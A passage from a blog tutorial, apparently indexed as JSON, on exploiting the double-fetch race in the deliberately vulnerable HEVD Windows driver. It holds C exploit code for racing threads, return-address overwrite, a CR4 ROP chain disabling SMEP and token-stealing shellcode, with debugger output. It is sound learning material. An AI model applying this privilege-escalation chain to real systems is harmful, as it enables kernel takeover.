(fffff805`b49468f8)\n\n1: kd&gt; \nHEVD!TriggerDoubleFetch+0xdc:\nfffff805`b49468f8 4c8d05f1280000  lea     r8,[HEVD! ?? ::NNGAKEGL::`string' (fffff805`b49491f0)]\n\n1: kd&gt; dq @rdx\n0000018c`38a252b0  41414141`41414141 41414141`41414141\n0000018c`38a252c0  41414141`41414141 41414141`41414141\n0000018c`38a252d0  41414141`41414141 41414141`41414141\n0000018c`38a252e0  41414141`41414141 41414141`41414141\n0000018c`38a252f0  41414141`41414141 41414141`41414141\n0000018c`38a25300  41414141`41414141 41414141`41414141\n0000018c`38a25310  41414141`41414141 41414141`41414141\n0000018c`38a25320  41414141`41414141 41414141`41414141\n\n1: kd&gt; dq @rcx\nffffb400`15e3dfb0  00000000`00000000 00000000`00000000\nffffb400`15e3dfc0  00000000`00000000 00000000`00000000\nffffb400`15e3dfd0  00000000`00000000 00000000`00000000\nffffb400`15e3dfe0  00000000`00000000 00000000`00000000\nffffb400`15e3dff0  00000000`00000000 00000000`00000000\nffffb400`15e3e000  00000000`00000000 00000000`00000000\nffffb400`15e3e010  00000000`00000000 00000000`00000000\nffffb400`15e3e020  00000000`00000000 00000000`00000000\n\n1: kd&gt; r\nrax=0000000000000000 rbx=0000000000000000 rcx=ffffb40015e3dfb0\nrdx=0000018c38a252b0 rsi=0000000000000003 rdi=0000018c389b0000\nrip=fffff805b4946911 rsp=ffffb40015e3df90 rbp=ffff8f886e5c87c0\n r8=0000000000000800  r9=0000000000000001 r10=0000000000000000\nr11=ffffb40015e3df88 r12=0000000000000000 r13=ffff8f886d97c6b0\nr14=000000000000004d r15=0000000000000800\niopl=0         nv up ei ng nz na po nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286\n\nHEVD!TriggerDoubleFetch+0xf5:\nfffff805`b4946911 e8aaa8f7ff      call    HEVD!memcpy (fffff805`b48c11c0)\n\n1: kd&gt; p\nHEVD!TriggerDoubleFetch+0xfa:\nfffff805`b4946916 eb1b            jmp     HEVD!TriggerDoubleFetch+0x117 (fffff805`b4946933)\n\n1: kd&gt; dq @rcx\nffffb400`15e3dfb0  41414141`41414141 41414141`41414141\nffffb400`15e3dfc0  41414141`41414141 41414141`41414141\nffffb400`15e3dfd0  41414141`41414141 41414141`41414141\nffffb400`15e3dfe0  41414141`41414141 41414141`41414141\nffffb400`15e3dff0  41414141`41414141 41414141`41414141\nffffb400`15e3e000  41414141`41414141 41414141`41414141\nffffb400`15e3e010  41414141`41414141 41414141`41414141\nffffb400`15e3e020  41414141`41414141 41414141`41414141\n</code></pre> <ol> <li><code>R15</code> has our input size.</li> <li><code>R9</code> has the size of the stack allocated buffer</li> </ol> <p>Awesome, we clearly are able to execute a copy providing that we don't violate the size value. The question now is how we can make it such that we pass the size check with one value but then change that value so that we actually copy more. The answer is, multithreading.</p>","title":"Exploit Summary 0x1"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#getting-started-with-multithreading","tags":["windows-kernel-exploitation"],"text":"<p>If you're not familar with multithreading it can be quite daunting at first. I'll do my best to describe all of the steps throughly however I am not a developer so if you're still unsure I'd highly recommend doing external reading around multithreading particularly in C.</p> <p>The first thing we'll want to do is check that we have enough processors to exploit the bug, when targeting TOCTOU and similar bugs its important that we can win the race. That is, if we don't have enough compute power then the attack will take significantly longer to exploit successfully. In order to check if we have enough processors we can use the <code>processthreadsapi</code> API. The below code block is a very simple function to check our number of processors and fail if we don't have more than 2. This is especially important as I am exploiting this vulnerability in a virtual machine, not on my host.</p> Check how many processors we have<pre><code>#include &lt;processthreadsapi.h&gt;\n\nint CheckProcessors(void)\n{\n    SYSTEM_INFO SystemInfo = {0};\n\n    /* Check if we have more than 2 processors as attack will take too long with less */\n    GetSystemInfo(&amp;SystemInfo);\n    if (SystemInfo.dwNumberOfProcessors &lt; 2)\n    {\n        printf(\"[!] FATAL: You don't have enough processors, exiting!\\n\");\n        exit(-1);\n    }\n\n    int NumProcessors = SystemInfo.dwNumberOfProcessors;\n    return NumProcessors;\n}\n</code></pre> <p>In order to pass data into threads the easiest way is to create a strucutre for the thread and then pass that structure when we create the thread. We'll create a structure for our function which will send the IOCTLs to the driver. It looks fairly similar to the structure we created earlier for <code>UserDoubleFetch</code>. Notice the two members here are <code>DriverHandle</code> and <code>DoubleFetch</code> was a pointer to the <code>_USER_DOUBLE_FETCH</code> structure that we created earlier.</p> Structure to pass data to our IOCTL thread<pre><code>typedef struct _IO_THREAD_PARAM\n{\n    HANDLE              DriverHandle; // (1)\n    PUSER_DOUBLE_FETCH  DoubleFetch; // (2)\n} IO_THREAD_PARAM, *PIO_THREAD_PARAM;\n</code></pre> <ol> <li>This will store the handle to the driver which we'll need to issue IOCTLs.</li> <li>This is a pointer to our DoubleFetch buffer that we'll use for the exploit.</li> </ol> <p>The next step is for us to create a thread specifically for updating the structures size member. First we'll create a new function that's sole purpose is modifying the size value of the structure. The function is fairly simple, one thing you might be unfamiliar with is the use of <code>GetCurrentProcessorNumber()</code> this is a function definied in <code>processthreadsapi.h</code> this is mostly just to help us with debugging during exploitation.</p> A thread to change the UserBuffer-&gt;Size member<pre><code>DWORD WINAPI ChangeSizeThread(LPVOID Size)\n{\n    BOOL ExploitSuccess;\n    int i = 0;\n\n    printf(\"[+] Changing size on processor %d\\n\", GetCurrentProcessorNumber());\n\n    while (!ExploitSuccess)\n    {\n        *(PULONG)Size ^= 0x00000808;    // 2056 bytes\n    }\n\n    return EXIT_SUCCESS;\n}\n</code></pre> <p>Next we'll need to create a function that will solely send our <code>DeviceIoControl</code> request this is important because we won't win the race first time and we need to be able to keep sending requests for every time we try to update the size of the struct member.</p> A thread to issue IOCTL requests for the exploit<pre><code>DWORD WINAPI IoControlThread(LPVOID IoThreadParam)\n{\n    BOOL    ExploitSuccess;\n\n    HANDLE              DriverHandle = NULL;\n    PIO_THREAD_PARAM    IoControlThreadParam = NULL;\n    PUSER_DOUBLE_FETCH  UserDoubleFetch = NULL;\n\n    DWORD   BytesReturned = 0;\n    int     i = 0;\n\n    /* Get pointer to thread parameter structure */\n    IoControlThreadParam = (PIO_THREAD_PARAM)IoThreadParam;\n\n    /* Get thread paremeter structure members  */\n    UserDoubleFetch = IoControlThreadParam-&gt;DoubleFetch;\n    DriverHandle = IoControlThreadParam-&gt;DriverHandle;\n\n    printf(\"[+] Sending IOCTL on processor %d\\n\", GetCurrentProcessorNumber());\n\n    while (!ExploitSuccess)\n    {\n        if(!DeviceIoControl(DriverHandle, IOCTL_CODE, UserDoubleFetch, 3000, NULL, NULL, &amp;BytesReturned, NULL))\n        {\n            printf(\"[!] FATAL: Unable to send IOCTL to driver!\\n\");\n        }\n    }\n\n    return EXIT_SUCCESS;\n}\n</code></pre> <p>Now that we've created a function to change the size value and a function to send the IOCTLs to the driver we'll need to create threads for those functions respectively. In addition to creating the threads we'll also want to do some basic thread management in that we'll need to change the thread priority via the <code>SetThreadPriority</code> function, doing this enables us to more easily win the race as we tell the scheduler to place our threads at the top of the order of execution.</p> <p>Additionally, we'll also want to set the threads affinity mask via the <code>SetThreadAffinityMask</code> function. This function allows us to tell the scheduler exactly what processor our thread should run on. It is worth noting that we should be careful when manually setting the Affinity mask as noted in this answer on StackOverflow. In order to simulate the behaviour described in that answer, i.e, setting the affinity mask from outside the thread and then shifting by 1 each round, we'll put our code inside a loop with the value of our max number of processors as our stopping point.</p> Initialising thread structure and creating threads to run for exploit<pre><code>    /* Allocate IO_THREAD_PARAM struct */\n    IoThreadParam = (PIO_THREAD_PARAM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));\n    if(!IoThreadParam)\n    {\n        printf(\"[!] FATAL: Failed to allocate memory for IO thread!\\n\");\n        return;\n    }\n\n    /* Initialise IO_THREAD_PARAM struct members */\n    IoThreadParam-&gt;DriverHandle = DriverHandle;\n    IoThreadParam-&gt;DoubleFetch  = PtrUserDoubleFetch;\n\n    for (int i = 0; i &lt; NumProcessors; i++)\n    {\n        HANDLE ChangeSizeHandle = CreateThread(NULL, NULL, ChangeSizeThread, &amp;PtrDoubleFetch-&gt;Size, CREATE_SUSPENDED, NULL);\n        HANDLE IoControlHandle = CreateThread(NULL, NULL, IoControlThread, IoThreadParam, CREATE_SUSPENDED, NULL);\n\n        if (!SetThreadPriority(ChangeSizeHandle, THREAD_PRIORITY_TIME_CRITICAL) || !SetThreadPriority(IoControlHandle, THREAD_PRIORITY_TIME_CRITICAL))\n        {\n            printf(\"[!] FATAL: Unable to set thread priority to highest!\\n\");\n        }\n        printf(\"[+] Set ChangeSizeThread Priority to %d\\n\", GetThreadPriority(ChangeSizeHandle));\n        printf(\"[+] Set IoControlThread Priority to %d\\n\", GetThreadPriority(IoControlHandle));\n\n        if (!SetThreadAffinityMask(ChangeSizeHandle, 1 &lt;&lt; i) || !SetThreadAffinityMask(IoControlHandle, 1 &lt;&lt; i + 1))\n        {\n            printf(\"[!] FATAL: Unable to set thread affinity!\\n\");\n        }\n\n        ResumeThread(ChangeSizeHandle);\n        ResumeThread(IoControlHandle);\n\n        if (WaitForMultipleObjects(NumProcessors, ChangeSizeHandle, TRUE, INFINITE))\n        {\n            TerminateThread(ChangeSizeHandle, EXIT_SUCCESS);\n            CloseHandle(ChangeSizeHandle);\n            printf(\"[+] Terminated change size thread!\\n\");\n        }\n\n        if (WaitForSingleObjects(NumProcessors, IoControlHandle, TRUE, INFINITE))\n        {\n            TerminateThread(IoControlHandle, EXIT_SUCCESS);\n            CloseHandle(IoControlHandle);\n            printf(\"[+] Terminated IO control thread!\\n\");\n        }\n\n    }\n</code></pre> <p>We've done a lot of work up to this point, let's take a look at the code altogether to recap where we've got to. I realise this code is quite daunting, at the end of the post I'll put a link to my full POC which I'll litter with comments.</p>","title":"Getting Started with Multithreading"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#exploit-summary-0x2","tags":["windows-kernel-exploitation"],"text":"Exploit so far<pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;processthreadsapi.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n#define IOCTL_CODE 0x222037\n\ntypedef struct _USER_DOUBLE_FETCH\n{\n    LPVOID  Buffer;\n    SIZE_T  Size;\n} USER_DOUBLE_FETCH, *PUSER_DOUBLE_FETCH;\n\ntypedef struct _IO_THREAD_PARAM\n{\n    HANDLE              DriverHandle;\n    PUSER_DOUBLE_FETCH  DoubleFetch;\n} IO_THREAD_PARAM, *PIO_THREAD_PARAM;\n\nHANDLE OpenDriverHandle(void)\n{\n    HANDLE DriverHandle = NULL;\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE)\n    {\n        printf(\"[!] FATAL: Failed to open driver handle!\\n\");\n        exit(-1);\n    }\n    else\n    {\n        printf(\"[+] Opened Driver Handle: 0x%x\\n\", DriverHandle);\n        return DriverHandle;\n    }\n}\n\nint CheckProcessors(void)\n{\n    SYSTEM_INFO SystemInfo = {0};\n\n    /* Check if we have more than 2 processors as attack will take too long with less */\n    GetSystemInfo(&amp;SystemInfo);\n    if (SystemInfo.dwNumberOfProcessors &lt; 2)\n    {\n        printf(\"[!] FATAL: You don't have enough processors, exiting!\\n\");\n        exit(-1);\n    }\n\n    int NumProcessors = SystemInfo.dwNumberOfProcessors;\n    return NumProcessors;\n}\n\nDWORD WINAPI ChangeSizeThread(LPVOID Size)\n{\n    BOOL    ExploitSuccess;\n\n    int i = 0;\n\n    printf(\"[+] Changing size on processor %d\\n\", GetCurrentProcessorNumber());\n\n    while (!ExploitSuccess)\n    {\n        *(PULONG)Size ^= 0x00000BB8;\n    }\n    return EXIT_SUCCESS;\n}\n\nDWORD WINAPI IoControlThread(LPVOID IoThreadParam)\n{\n    BOOL    ExploitSuccess;\n\n    PIO_THREAD_PARAM IoControlThreadParam = NULL;\n    HANDLE DriverHandle = NULL;\n    PUSER_DOUBLE_FETCH UserDoubleFetch = NULL;\n\n    DWORD   BytesReturned = 0;\n    int     i = 0;\n\n    printf(\"[+] Sending IOCTL on processor %d\\n\", GetCurrentProcessorNumber());\n\n    IoControlThreadParam = (PIO_THREAD_PARAM)IoThreadParam;\n    UserDoubleFetch = IoControlThreadParam-&gt;DoubleFetch;\n    DriverHandle = IoControlThreadParam-&gt;DriverHandle;\n\n    while (!ExploitSuccess)\n    {\n        if (!DeviceIoControl(DriverHandle, IOCTL_CODE, UserDoubleFetch, 3000, NULL, NULL, &amp;BytesReturned, NULL))\n        {\n            printf(\"[!] FATAL: Unable to send IOCTL to driver!\\n\");\n        }\n    }\n    return EXIT_SUCCESS;\n}\n\nvoid exploit(DriverHandle)\n{\n\n    LPVOID  UserBuffer = {0};\n    SIZE_T  UserBufferSize = 2048;\n\n    PIO_THREAD_PARAM IoThreadParam = NULL;\n\n    int NumProcessors = CheckProcessors();\n\n    /* Allocate USER_DOUBLE_FETCH struct */\n    USER_DOUBLE_FETCH* PtrUserDoubleFetch = (USER_DOUBLE_FETCH*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);\n    if(!PtrUserDoubleFetch)\n    {\n        printf(\"[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!\\n\");\n        return;\n    }\n\n    /* Allocate USER_DOUBLE_FETCH members */\n    UserBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);\n    if(!UserBuffer)\n    {\n        printf(\"[!] FATAL: Failed to allocate heap buffer!\\n\");\n        return;\n    }\n\n    /* Initialize USER_DOUBLE_FETCH struct members */\n    PtrUserDoubleFetch-&gt;Buffer  = UserBuffer;\n    PtrUserDoubleFetch-&gt;Size    = UserBufferSize;\n\n    /* Allocate IO_THREAD_PARAM struct */\n    IoThreadParam = (PIO_THREAD_PARAM*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));\n    if(!IoThreadParam)\n    {\n        printf(\"[!] FATAL: Failed to allocate memory for IO thread!\\n\");\n        return;\n    }\n\n    /* Initialise IO_THREAD_PARAM struct members */\n    IoThreadParam-&gt;DriverHandle = DriverHandle;\n    IoThreadParam-&gt;DoubleFetch  = PtrUserDoubleFetch;\n\n\n    for (int i = 0; i &lt; NumProcessors; i += 2)\n    {\n        HANDLE ChangeSizeHandle = CreateThread(NULL, NULL, ChangeSizeThread, &amp;PtrUserDoubleFetch-&gt;Size, CREATE_SUSPENDED, NULL);\n        HANDLE IoControlHandle = CreateThread(NULL, NULL, IoControlThread, IoThreadParam, CREATE_SUSPENDED, NULL);\n\n        if (!SetThreadPriority(ChangeSizeHandle, THREAD_PRIORITY_TIME_CRITICAL) || !SetThreadPriority(IoControlHandle, THREAD_PRIORITY_TIME_CRITICAL))\n        {\n            printf(\"[!] FATAL: Unable to set thread priority to highest!\\n\");\n        }\n        printf(\"[+] Set ChangeSizeThread Priority to %d\\n\", GetThreadPriority(ChangeSizeHandle));\n        printf(\"[+] Set IoControlThread Priority to %d\\n\", GetThreadPriority(IoControlHandle));\n\n        if (!SetThreadAffinityMask(ChangeSizeHandle, 1 &lt;&lt; i) || !SetThreadAffinityMask(IoControlHandle, 1 &lt;&lt; i + 1))\n        {\n            printf(\"[!] FATAL: Unable to set thread affinity!\\n\");\n        }\n\n        ResumeThread(ChangeSizeHandle);\n        ResumeThread(IoControlHandle);\n\n        if (WaitForMultipleObjects(NumProcessors, ChangeSizeHandle, TRUE, INFINITE))\n        {\n            TerminateThread(ChangeSizeHandle, EXIT_SUCCESS);\n            CloseHandle(ChangeSizeHandle);\n            printf(\"[+] Terminated change size thread!\\n\");\n        }\n\n        if (WaitForMultipleObjects(NumProcessors, IoControlHandle, TRUE, INFINITE))\n        {\n            TerminateThread(IoControlHandle, EXIT_SUCCESS);\n            CloseHandle(IoControlHandle);\n            printf(\"[+] Terminated IO control thread!\\n\");\n        }\n\n    }\n}\n\nint main()\n{\n    printf(\"[+] HEVD: Double Fetch\\n\");\n\n    printf(\"[*] Opening handle to driver!\\n\");\n    HANDLE DriverHandle = OpenDriverHandle();\n\n    printf(\"[*] Running exploit function!\\n\");\n    exploit(DriverHandle);\n}\n</code></pre>","title":"Exploit Summary 0x2"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#exploitation","tags":["windows-kernel-exploitation"],"text":"<p>If we run the above code on our vulnerable machine after a short while we should get an access violation. In the current code we'll get this access violation due to an invalid memory access as we've not actually over filled the buffer yet. However, an access violation is good news, it means we're nearly there.</p> <pre><code>Access violation - code c0000005 (!!! second chance !!!)\nHEVD!TriggerDoubleFetch+0x136:\nfffff801`11086952 c3              ret\n\n1: kd&gt; !analyze\nConnected to Windows 10 14393 x64 target at (Sat May 21 16:06:24.400 2022 (UTC + 1:00)), ptr64 TRUE\n*******************************************************************************\n*                                                                             *\n*                        Bugcheck Analysis                                    *\n*                                                                             *\n*******************************************************************************\n\nUnknown bugcheck code (0)\nUnknown bugcheck description\nArguments:\nArg1: 0000000000000000\nArg2: 0000000000000000\nArg3: 0000000000000000\nArg4: 0000000000000000\n\nDebugging Details:\n------------------\n\nBUGCHECK_CODE:  0\nBUGCHECK_P1: 0\nBUGCHECK_P2: 0\nBUGCHECK_P3: 0\nBUGCHECK_P4: 0\n\nPROCESS_NAME:  DoubleFetchPoc.exe\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\nSYMBOL_NAME:  HEVD!TriggerDoubleFetch+136\nMODULE_NAME: HEVD\nIMAGE_NAME:  HEVD.sys\nFAILURE_BUCKET_ID:  ACCESS_VIOLATION_HEVD!TriggerDoubleFetch\nFAILURE_ID_HASH:  {d6d20acb-bd59-8959-eb71-904d3e00084e}\nFollowup:     MachineOwner\n</code></pre> <p>Now that we know we can invoke an access violation the next goal is overwriting the return address and proving that we can turn this vulnerability into code execution. We'll start by filling the buffer with As and then flipping the size value like we've just done, this will prove that we can gain control of ret. Following that we'll then figure out at what offset we gain control of the instruction pointer. First we'll need to make some modifications to our POC, as shown below.</p> <pre><code>    SIZE_T  UserBufferSize = 3000;\n\n    /* Initialize USER_DOUBLE_FETCH struct members */\n    PtrUserDoubleFetch-&gt;Buffer  = UserBuffer;\n    PtrUserDoubleFetch-&gt;Size    = 1000;\n\n    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);\n</code></pre> <p>With those changes completed we can simply run the new POC and we should have control of the return address.</p> <pre><code>Windows 10 Kernel Version 14393 MP (1 procs) Free x64\nEdition build lab: 14393.2189.amd64fre.rs1_release.180329-1711\nMachine Name:\nKernel base = 0xfffff801`6a811000 PsLoadedModuleList = 0xfffff801`6ab19140\nSystem Uptime: 0 days 0:00:00.873\nKDTARGET: Refreshing KD connection\nAccess violation - code c0000005 (!!! second chance !!!)\nHEVD!TriggerDoubleFetch+0x136:\nfffff802`4d6a6952 c3              ret\n\n1: kd&gt; k\n # Child-SP          RetAddr               Call Site\n00 ffffbc80`5a3d37b8 41414141`41414141     HEVD!TriggerDoubleFetch+0x136 \n01 ffffbc80`5a3d37c0 41414141`41414141     0x41414141`41414141\n02 ffffbc80`5a3d37c8 41414141`41414141     0x41414141`41414141\n03 ffffbc80`5a3d37d0 41414141`41414141     0x41414141`41414141\n04 ffffbc80`5a3d37d8 41414141`41414141     0x41414141`41414141\n05 ffffbc80`5a3d37e0 41414141`41414141     0x41414141`41414141\n06 ffffbc80`5a3d37e8 41414141`41414141     0x41414141`41414141\n07 ffffbc80`5a3d37f0 41414141`41414141     0x41414141`41414141\n08 ffffbc80`5a3d37f8 41414141`41414141     0x41414141`41414141\n09 ffffbc80`5a3d3800 41414141`41414141     0x41414141`41414141\n</code></pre> <p>Perfect, we clearly have control. Now we need to work out the correct offset for control of the instruction pointer. In the previous code block we sent 3000 bytes in total and we control the return address at <code>ffffbc805a3d37b8</code> and our data is on the stack until <code>ffffbc805a3d3978</code> - we can get the difference between these two numbers and then minus that from the size.</p> <pre><code>1: kd&gt; ? ffffbc80`5a3d3978 - ffffbc80`5a3d37b8\nEvaluate expression: 448 = 00000000`000001c0\n</code></pre> <p>After doing the above I realised that I can actually make my life easier by making the initial size value smaller. In the above output our initial size value is <code>1000</code> as shown below.</p> <pre><code>PtrUserDoubleFetch-&gt;Size = 1000;\n</code></pre> <p>But if we actually make this value smaller, say 100 then we don't need to write as far. In the end the offset ended up being at 2056 bytes. The code changes I made are shown below.</p> <pre><code>/* Function to change the size member of the UserDoubleFetch struct */\nDWORD WINAPI ChangeSizeThread(LPVOID Size)\n{\n    BOOL ExploitSuccess;\n    int i = 0;\n\n    printf(\"[+] Changing size on processor %d\\n\", GetCurrentProcessorNumber());\n\n    while (!ExploitSuccess)\n    {\n        *(PULONG)Size ^= 0x00000808; // 2056\n    }\n\n    return EXIT_SUCCESS;\n}\n\n    /* Initialize USER_DOUBLE_FETCH struct members */\n    PtrUserDoubleFetch-&gt;Buffer  = UserBuffer;\n    PtrUserDoubleFetch-&gt;Size    = 100;\n\n    RtlFillMemory(UserBuffer, UserBufferSize, 0x41);\n    RtlFillMemory(&amp;UserBuffer[2056], 8, 0x42);\n</code></pre> <p>If we run the updated POC above we gain exact control of the return address at 2056 bytes, as shown below.</p> <pre><code>Access violation - code c0000005 (!!! second chance !!!)\nHEVD!TriggerDoubleFetch+0x136:\nfffff807`7b3a6952 c3              ret\n\n1: kd&gt; k\n # Child-SP          RetAddr               Call Site\n00 ffff9381`761277b8 42424242`42424242     HEVD!TriggerDoubleFetch+0x136 \n01 ffff9381`761277c0 00000000`00000000     0x42424242`42424242\n</code></pre> <p>Now that we've got exact control of the return address we can begin building our final payload. However, if you read last post you'll know that we need to bypass SMEP in order to get execution. We can do this very easily using a simple ROP chain.</p>","title":"Exploitation"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#bypassing-smep","tags":["windows-kernel-exploitation"],"text":"<p>I won't cover it again in full detail here but essentially all we need to do is get the kernel base address through <code>EnumDeviceDrivers</code> and then move the value <code>0x70678</code> into the CR4 register which will disable SMEP. If you'd like more detail on this please refer to my last post. Below is the code needed to get the kernel base address and then update the CR4 register.</p> <pre><code>unsigned long long GetKernelBase(void)\n{\n\n    LPVOID  lpImageBase[1024];\n    DWORD   lpcbNeeded;\n\n    /* Get base address of first driver (ntoskrnl.exe) */\n    printf(\"[+] Obtaining Driver Base Address!\\n\");\n    BOOL DriversBase = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &amp;lpcbNeeded);\n    if (!DriversBase)\n    {\n        printf(\"[!] FATAL: Error enumerating device drivers!\\n\");\n        exit(1);\n    }\n\n    /* Get name of first driver (ntoskrnl.exe) */\n    char BaseName[1024] = {0};\n    BOOL DriversBaseName = GetDeviceDriverBaseNameA(lpImageBase[0], BaseName, sizeof(BaseName));\n    if (!DriversBaseName)\n    {\n        printf(\"[!] FATAL: Error getting drivers base name!\\n\");\n        exit(1);\n    }\n\n    /* \n     * ntoskrnl.exe is the first module in lpImageBase.\n     * typecast LPVOID -&gt; unsigned long long\n    */\n    unsigned long long KernelBase = (unsigned long long)lpImageBase[0];\n\n    printf(\"[*] Driver base name is: %s\\n\", BaseName);\n    printf(\"[*] %s is located at: 0x%p\\n\", BaseName, KernelBase);\n\n    return KernelBase;\n\n}\n</code></pre>","title":"Bypassing SMEP"},{"location":"Posts/2022/2022-05-21-HEVD3-DoubleFetch/#shellcode","tags":["windows-kernel-exploitation"],"text":"<p>Shellcode specifically kernel continuation was definitely the most difficult part of this exploit. Although in theory it should be fairly similar to the continuation we used in the previous post, that was far from being the case. In-fact, this was way more difficult so let me walk you through it. I should note at this point that I actually did not get a working POC on Windows RS1, out of pure frustration I ended up writing POCs for RS1, RS2, RS4 and RS6 and RS4 was the release that I managed to get a SYSTEM shell on. That's not to say it isn't possible to get kernel continuation on those other releases, I just couldn't get it working. If anyone has any insight on this then I'd love to hear it. Let's start by looking at the shellcode which itself is fairly standard, just a typical token stealing payload for RS4.</p> <pre><code>_START:\n    push   r8\n    push   r9\n    push   rax\n\n    mov    r8,QWORD PTR gs:0x188\n    mov    DWORD PTR [r8+0x1e4], 0x0\n    mov    r9,QWORD PTR [r8+0xb8]\n    mov    rax,r9\n\n_LOOP:   \n    mov    rcx,QWORD PTR [r9+0x2e0]\n    cmp    rcx,0x4\n    je     _LOOP\n    mov    r9,QWORD PTR [r9+0x2e8]\n    sub    r9,0x2e8\n    jmp    _LOOP\n    mov    rcx,QWORD PTR [r9+0x358]\n    and    cl,0xf0\n    mov    QWORD PTR [rax+0x358],rcx\n\n    pop    rcx\n    pop    r9\n    pop    r8\n</code></pre> <p>As you can see the shellcode is not out of the ordinary and only varies slightly to the shellcode we used in the last post. The part that takes ages here is getting the kernel continuation after executing the shellcode. When we leave the <code>TriggerDoubleFetch</code> function in normal code execution we return into the <code>DoubleFetchIoctlHandler</code> function and then 0x28 is added to RSP. This behaviour is shown below.</p> <pre><code>0: kd&gt; bp HEVD!TriggerDoubleFetch+136\n\n0: kd&gt; g\nBreakpoint 0 hit\nHEVD!TriggerDoubleFetch+0x136:\nfffff80e`c5aa6952 c3              ret\n\n0: kd&gt; p\nHEVD!DoubleFetchIoctlHandler+0x17:\nfffff80e`c5aa6817 4883c428        add     rsp,28h\n\n1: kd&gt; p\nHEVD!DoubleFetchIoctlHandler+0x1b:\nfffff80e`c5aa681b c3              ret\n\n1: kd&gt; p\nHEVD!IrpDeviceIoCtlHandler+0x26d:\nfffff80e`c5aa52e5 4c8d05e4320000  lea     r8,[HEVD! ?? ::NNGAKEGL::`string' (fffff80e`c5aa85d0)]\n</code></pre> <p>We can place a breakpoint before the <code>memcpy</code> and take a look at the call stack to see what possible return points there are.</p> <pre><code>0: kd&gt; bp HEVD!TriggerDoubleFetch+F5\n\n0: kd&gt; g\nBreakpoint 1 hit\nHEVD!TriggerDoubleFetch+0xf5:\nfffff80e`c5aa6911 e8aaa8f7ff      call    HEVD!memcpy (fffff80e`c5a211c0)\n\n0: kd&gt; k\n # Child-SP          RetAddr               Call Site\n00 fffff909`4386ef70 fffff80e`c5aa6817     HEVD!TriggerDoubleFetch+0xf5 [c:\\projects\\hevd\\driver\\hevd\\doublefetch.c @ 137] \n01 fffff909`4386f7a0 fffff80e`c5aa52e5     HEVD!DoubleFetchIoctlHandler+0x17 [c:\\projects\\hevd\\driver\\hevd\\doublefetch.c @ 176] \n02 fffff909`4386f7d0 fffff802`dfb18799     HEVD!IrpDeviceIoCtlHandler+0x26d [c:\\projects\\hevd\\driver\\hevd\\hacksysextremevulnerabledriver.c @ 342] \n03 fffff909`4386f800 fffff802`dffb887b     nt!IofCallDriver+0x59\n04 fffff909`4386f840 fffff802`dffbcdea     nt!IopSynchronousServiceTail+0x1ab\n05 fffff909`4386f8f0 fffff802`dffba7d6     nt!IopXxxControlFile+0x68a\n06 fffff909`4386fa20 fffff802`dfbd6243     nt!NtDeviceIoControlFile+0x56\n07 fffff909`4386fa90 00007ffb`0cd6aa84     nt!KiSystemServiceCopyEnd+0x13\n08 00000053`fbdffc88 00007ffb`09722766     ntdll!NtDeviceIoControlFile+0x14\n09 00000053`fbdffc90 00007ff6`66a79124     0x00007ffb`09722766\n0a 00000053`fbdffc98 00000000`00000000     0x00007ff6`66a79124\n</code></pre> <p>Before we attempt to return to any of these lets run our payload as-is and see what the register layout is like and also how our stack looks after executing our ROP chain to disable SMEP and our shellcode. We can place a breakpoint on <code>nt!KiSetPageAttributesTable+0xc5</code> to get to our <code>pop rcx ; ret</code> gadget.</p> <pre><code>0: kd&gt; bp nt!KiSetPageAttributesTable+0xc5\n\n0: kd&gt; g\nBreakpoint 0 hit\nnt!KiSetPageAttributesTable+0xc5:\nfffff801`1ab0ebf9 59              pop     rcx\n\n1: kd&gt; p\nnt!KiSetPageAttributesTable+0xc6:\nfffff801`1ab0ebfa c3              ret\n\n1: kd&gt; \nnt!KeFlushCurrentTbImmediately+0x17:\nfffff801`1a7fff37 0f22e1          mov     cr4,rcx\n\n1: kd&gt; \n000001f2`afa60000 4150            push    r8\n1: kd&gt; \n000001f2`afa60002 4151            push    r9\n1: kd&gt; \n000001f2`afa60004 50              push    rax\n\n[...]\n\n1: kd&gt; \n000001f2`afa60051 59              pop     rcx\n1: kd&gt; \n000001f2`afa60052 4159            pop     r9\n1: kd&gt; \n000001f2`afa60054 4158            pop     r8\n\n1: kd&gt; k\n # Child-SP          RetAddr               Call Site\n00 fffff909`439e07c0 59d28afc`59d28afc     0x0000016e`841b0056\n01 fffff909`439e07c8 f211216f`51bc83f5     0x59d28afc`59d28afc\n02 fffff909`439e07d0 fa712831`7e520c4b     0xf211216f`51bc83f5\n03 fffff909`439e07d8 ffffa6d3`fa71295f     0xfa712831`7e520c4b\n04 fffff909`439e07e0 fffff80e`c5aa85d0     0xffffa6d3`fa71295f\n05 fffff909`439e07e8 00000000`00222037     HEVD! ?? ::NNGAKEGL::`string'\n06 fffff909`439e07f0 00000000`00000002     0x222037\n07 fffff909`439e07f8 fffff802`dfb18799     0x2\n08 fffff909`439e0800 fffff802`dffb887b     nt!IofCallDriver+0x59\n09 fffff909`439e0840 fffff802`dffbcdea     nt!IopSynchronousServiceTail+0x1ab\n0a fffff909`439e08f0 fffff802`dffba7d6     nt!IopXxxControlFile+0x68a\n0b fffff909`439e0a20 fffff802`dfbd6243     nt!NtDeviceIoControlFile+0x56\n0c fffff909`439e0a90 00007ffb`0cd6aa84     